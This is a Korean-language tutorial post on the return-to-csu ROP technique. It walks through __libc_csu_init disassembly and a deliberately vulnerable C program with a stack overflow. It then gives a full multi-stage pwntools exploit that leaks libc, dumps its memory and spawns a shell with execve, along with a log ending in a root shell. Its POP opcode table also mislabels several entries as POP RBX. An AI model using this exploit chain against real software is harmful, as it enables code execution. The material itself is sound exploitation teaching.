---
title: Return-to-csu
author: Beomsu Lee
category: [Exploitation, Stack]
tags: [exploitation, stack, return-to-csu]
math: true
mermaid: true
---

## Description

return-to-csu는 `__libc_csu_init()` 함수의 일부 코드를 gadget으로 이용하는 기법이다. 다음과 같이 gadget 1, 2를 사용한다.

```
...
00000000004005b0 <__libc_csu_init>:
  4005b0:   41 57                   push   r15
  4005b2:   41 56                   push   r14
  4005b4:   41 89 ff                mov    r15d,edi
  4005b7:   41 55                   push   r13
  4005b9:   41 54                   push   r12
  4005bb:   4c 8d 25 4e 08 20 00    lea    r12,[rip+0x20084e]        # 600e10 <__frame_dummy_init_array_entry>
  4005c2:   55                      push   rbp
  4005c3:   48 8d 2d 4e 08 20 00    lea    rbp,[rip+0x20084e]        # 600e18 <__init_array_end>
  4005ca:   53                      push   rbx
  4005cb:   49 89 f6                mov    r14,rsi
  4005ce:   49 89 d5                mov    r13,rdx
  4005d1:   4c 29 e5                sub    rbp,r12
  4005d4:   48 83 ec 08             sub    rsp,0x8
  4005d8:   48 c1 fd 03             sar    rbp,0x3
  4005dc:   e8 1f fe ff ff          call   400400 <_init>
  4005e1:   48 85 ed                test   rbp,rbp
  4005e4:   74 20                   je     400606 <__libc_csu_init+0x56>
  4005e6:   31 db                   xor    ebx,ebx
  4005e8:   0f 1f 84 00 00 00 00    nop    DWORD PTR [rax+rax*1+0x0]
  4005ef:   00
  4005f0:   4c 89 ea                mov    rdx,r13        <------- Gadget 2
  4005f3:   4c 89 f6                mov    rsi,r14
  4005f6:   44 89 ff                mov    edi,r15d
  4005f9:   41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
  4005fd:   48 83 c3 01             add    rbx,0x1
  400601:   48 39 eb                cmp    rbx,rbp
  400604:   75 ea                   jne    4005f0 <__libc_csu_init+0x40>
  400606:   48 83 c4 08             add    rsp,0x8
  40060a:   5b                      pop    rbx      <------- Gadget 1
  40060b:   5d                      pop    rbp
  40060c:   41 5c                   pop    r12
  40060e:   41 5d                   pop    r13
  400610:   41 5e                   pop    r14
  400612:   41 5f                   pop    r15
  400614:   c3                      ret   
  400615:   90                      nop
  400616:   66 2e 0f 1f 84 00 00    nop    WORD PTR cs:[rax+rax*1+0x0]
...
```

gadget 1에 의해 rbx, rbp, r12, r13, r14, r15 레지스터에 값을 저장한다. gadget 2에 의해 r13, r14, r15d 레지스터에 저장된 값을 rdx, rsi, edi레지스터에 저장한다. r15에 저장된 64bit 값에서 32bit 값만 EDI 레지스터에 저장한다. 최대 3개 인자 값만 함수에 전달이 가능하다.

gadget 2에 의해 r12 레지스터 값에 저장된 주소를 호출한다. 주의할 점은 gadget 1에 의해 rbx 레지스터에 ’0’을 저장해야 r12 레지스터 값에 저장된 주소를 호출할 수 있다.

gadget 1에 의해 rbp 레지스터에 ’1’을 저장해야 조건문을 우회할 수 있다. "call QWORD PTR [r12+rbx*8]" 명령어 처리 후 조건문을 처리한다. 그 후 cmp 명령은 rbx, rbp 레지스터의 값이 같은지를 확인한 후 두 값이 같은 경우 0x400606으로 이동한다.

```
4005f9:   41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
4005fd:   48 83 c3 01             add    rbx,0x1
400601:   48 39 eb                cmp    rbx,rbp
400604:   75 ea                   jne    4005f0 <__libc_csu_init+0x40>
400606:   48 83 c4 08             add    rsp,0x8
40060a:   5b                      pop    rbx
40060b:   5d                      pop    rbp
40060c:   41 5c                   pop    r12
40060e:   41 5d                   pop    r13
400610:   41 5e                   pop    r14
400612:   41 5f                   pop    r15
400614:   c3                      ret
```

## Proof of concept

```c
// Vuln Code
// gcc -fno-stack-protector -o rop rop.c
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
 
void vuln(){
    char buf[50];
    read(0, buf, 512);
}
 
void main(){
    write(1,"Hello ROP\n",10);
    vuln();
}
```

72개 이상 문자를 입력할 경우 overflow 발생한다.

## Exploit Method

1. Stage
    - write() 함수를 이용하여 __libc_start_main@GOT 영역에 저장된 libc 주소 출력
    - read() 함수를 이용해 .bss 영역에 2 Stage의 ROP 코드를 입력받음
2. Stage
    - “/bin/sh\x00”을 .bss 영역에 저장
    - write() 함수를 이용해 메모리에 저장된 libc 파일 추출(JIT ROP)
    - 추출한 libc에서 필요한 ROP Gadget 획득
    - read() 함수를 이용해 3 Stage의 ROP 코드를 입력받음
3. Stage
    - execve(“/bin/sh”,NULL,NULL)

```c
write(1,__libc_start_main,8)
read(0,.bss + 0x400,400)
JMP .bss + 0x400
write(1,Address of leak libc,0x190000)
read(0,"base_stage + len(buf) + 8 * 10" ,100)
execve("/bin/sh", NULL, NULL)
```

.bss 영역 주소

```
root@bs-virtual-machine:~/pwnable/return-to-csu# readelf -S ./rop
There are 31 section headers, starting at offset 0x1a28:
Section Headers:
  [Nr] Name              Type             Address           Offset
      Size              EntSize          Flags  Link  Info  Align
  ...
  [26] .bss              NOBITS           0000000000601040  00001040
      0000000000000008  0000000000000000  WA       0     0     1
  ...
```

`__libc_csu_init`의 gadget을 확인한다.

```
00000000004005b0 <__libc_csu_init>:
  4005b0:   41 57                   push   %r15
  4005b2:   41 56                   push   %r14
  4005b4:   41 89 ff                mov    %edi,%r15d
  4005b7:   41 55                   push   %r13
  4005b9:   41 54                   push   %r12
  4005bb:   4c 8d 25 4e 08 20 00    lea    0x20084e(%rip),%r12        # 600e10 <__frame_dummy_init_array_entry>
  4005c2:   55                      push   %rbp
  4005c3:   48 8d 2d 4e 08 20 00    lea    0x20084e(%rip),%rbp        # 600e18 <__init_array_end>
  4005ca:   53                      push   %rbx
  4005cb:   49 89 f6                mov    %rsi,%r14
  4005ce:   49 89 d5                mov    %rdx,%r13
  4005d1:   4c 29 e5                sub    %r12,%rbp
  4005d4:   48 83 ec 08             sub    $0x8,%rsp
  4005d8:   48 c1 fd 03             sar    $0x3,%rbp
  4005dc:   e8 1f fe ff ff          callq  400400 <_init>
  4005e1:   48 85 ed                test   %rbp,%rbp
  4005e4:   74 20                   je     400606 <__libc_csu_init+0x56>
  4005e6:   31 db                   xor    %ebx,%ebx
  4005e8:   0f 1f 84 00 00 00 00    nopl   0x0(%rax,%rax,1)
  4005ef:   00 
  4005f0:   4c 89 ea                mov    %r13,%rdx        <--- Gadget 2
  4005f3:   4c 89 f6                mov    %r14,%rsi
  4005f6:   44 89 ff                mov    %r15d,%edi
  4005f9:   41 ff 14 dc             callq  *(%r12,%rbx,8)
  4005fd:   48 83 c3 01             add    $0x1,%rbx
  400601:   48 39 eb                cmp    %rbp,%rbx
  400604:   75 ea                   jne    4005f0 <__libc_csu_init+0x40>
  400606:   48 83 c4 08             add    $0x8,%rsp
  40060a:   5b                      pop    %rbx        <--- Gadget 1
  40060b:   5d                      pop    %rbp
  40060c:   41 5c                   pop    %r12
  40060e:   41 5d                   pop    %r13
  400610:   41 5e                   pop    %r14
  400612:   41 5f                   pop    %r15
  400614:   c3                      retq   
  400615:   90                      nop
  400616:   66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)
  40061d:   00 00 00 
```

다음과 같이 POP 명령을 활용할 수 있다. 해당 exploit code에서 POP RSP를 사용하여 RSP 레지스터에 값을 저장하고 해당 영역으로 이동하여 코드를 실행한다.

|Register|Raw Hex|Register|Raw Hex|
|:---:|:---:|:---:|:---:|
|POP R8|41 58|POP RAX|58|
|POP R9|41 59|POP RCX|59|
|POP R10|41 5a|POP RDX|5a|
|POP R11|41 5b|POP RBX|5b|
|POP R12|41 5c|POP RBX|5c|
|POP R13|41 5d|POP RBX|5d|
|POP R14|41 5e|POP RBX|5e|
|POP R15|41 5f|POP RBX|5f|

## Exploit code

```python
# Exploit Code
from pwn import *

binary = ELF('./rop')

execve = 59

addr_bss = 0x601040
addr_got_read = binary.got['read']
addr_got_write = binary.got['write']
addr_got_start = binary.got['__libc_start_main']

addr_csu_init1 = 0x40060a
addr_csu_init2 = 0x4005f0
addr_csu_init3 = 0x40060d

stack_size = 0x400
base_stage = addr_bss + stack_size

p = process(binary.path)
log.info(p.recvline())

payload = "A"*72
# Stage 1
# write(1,__libc_start_main,8)
payload += p64(addr_csu_init1)
payload += p64(0)                 # pop rbx
payload += p64(1)                 # pop rbp
payload += p64(addr_got_write)    # pop r12
payload += p64(8)                 # pop r13 (arg3)
payload += p64(addr_got_start)    # pop r14 (arg2)
payload += p64(1)                 # pop r15 (arg1)
payload += p64(addr_csu_init2)    # ret

payload += p64(0)                 # rsp add,0x8 

# read(0, .bss + 0x400,400)
payload += p64(0)                 # pop rbx
payload += p64(1)                 # pop rbp
payload += p64(addr_got_read)     # pop r12
payload += p64(400)               # pop r13 (arg3)
payload += p64(base_stage)        # pop r14 (arg2)
payload += p64(0)                 # pop r15 (arg1)
payload += p64(addr_csu_init2)    # ret

payload += p64(0)                 # rsp add,0x8 

payload += p64(0)                 # pop rbx
payload += p64(0)                 # pop rbp
payload += p64(0)                 # pop r12
payload += p64(0)                 # pop r13 (arg3)
payload += p64(0)                 # pop r14 (arg2)
payload += p64(0)                 # pop r15 (arg1)

payload += p64(addr_csu_init3)    # pop rsp
payload += p64(base_stage)        # ret

p.send(payload)

# Stage 2
libc_addr = u64(p.recvn(8))
log.info('__libc_start_main: '+ hex(libc_addr))

libc_bin = ''
libc_readsize = 0x190000

payload = "/bin/sh\x00"           # .bss + 0x400 -> /bin/sh
payload += "A" * (24 - len(payload)) # pop r13, r14, r15

# write(1, Address of leak libc, 0x190000)
payload += p64(addr_csu_init1)
payload += p64(0)                 # pop rbx
payload += p64(1)                 # pop rbp
payload += p64(addr_got_write)    # pop r12
payload += p64(libc_readsize)     # pop r13 (arg3)
payload += p64(libc_addr)         # pop r14 (arg2)
payload += p64(1)                 # pop r15 (arg1)
payload += p64(addr_csu_init2)    # ret

payload += p64(0)                 # rsp add,0x8 

# call read(0, .bss + 0x400,400)
payload += p64(0)                 # pop rbx
payload += p64(1)                 # pop rbp
payload += p64(addr_got_read)     # pop r12
payload += p64(100)               # pop r13 (arg3)
# 8 * 10 <- remainder payload len
payload += p64(base_stage + len(payload) + 8 * 10) # pop r14 (arg2) 
payload += p64(0)                 # pop r15 (arg1)
payload += p64(addr_csu_init2)    # ret

payload += p64(0)                 # rsp add,0x8 

payload += p64(0)                 # pop rbx
payload += p64(0)                 # pop rbp
payload += p64(0)                 # pop r12
payload += p64(0)                 # pop r13 (arg3)
payload += p64(0)                 # pop r14 (arg2)
payload += p64(0)                 # pop r15 (arg1)

p.send(payload)

for i in range(0,libc_readsize/4096):
    libc_bin += p.recv(4096)

# Find ROP Gadget
pop_rax_offset = libc_bin.index('\x58\xc3')
pop_rdi_offset = libc_bin.index('\x5f\xc3')
pop_rsi_offset = libc_bin.index('\x5e\xc3')
pop_rdx_offset = libc_bin.index('\x5a\xc3')
syscall_offset = libc_bin.index('\x0f\x05')

log.info('pop rax addr: ' + hex(libc_addr + pop_rax_offset))
log.info('pop rdi addr: ' + hex(libc_addr + pop_rdi_offset))
log.info('pop rsi addr: ' + hex(libc_addr + pop_rsi_offset))
log.info('pop rdx addr: ' + hex(libc_addr + pop_rdx_offset))
log.info('syscall addr: ' + hex(libc_addr + syscall_offset))

# Stage 3
# execve("/bin/sh",NULL,NULL)
payload = p64(libc_addr + pop_rax_offset)
payload += p64(execve)
payload += p64(libc_addr + pop_rdi_offset)
payload += p64(base_stage)
payload += p64(libc_addr + pop_rsi_offset)
payload += p64(0)
payload += p64(libc_addr + pop_rdx_offset)
payload += p64(0)
payload += p64(libc_addr + syscall_offset)

p.send(payload)
p.interactive()
```

## Exploit

```bash
root@bs-virtual-machine:~/pwnable/return-to-csu# python exploit.py 
[*] '/root/pwnable/return-to-csu/rop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/root/pwnable/return-to-csu/rop': pid 19236
[*] Hello ROP
[*] __libc_start_main: 0x7f7767ab7740
[*] pop rax addr: 0x7f7767aca544
[*] pop rdi addr: 0x7f7767ab8102
[*] pop rsi addr: 0x7f7767ab9bb5
[*] pop rdx addr: 0x7f7767bac0a6
[*] syscall addr: 0x7f7767ab78a4
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
$ pwd
/root/pwnable/return-to-csu
```

## References
- [01.Return-to-csu (feat.JIT ROP) - x64](https://www.lazenca.net/display/TEC/01.Return-to-csu+%28feat.JIT+ROP%29+-+x64)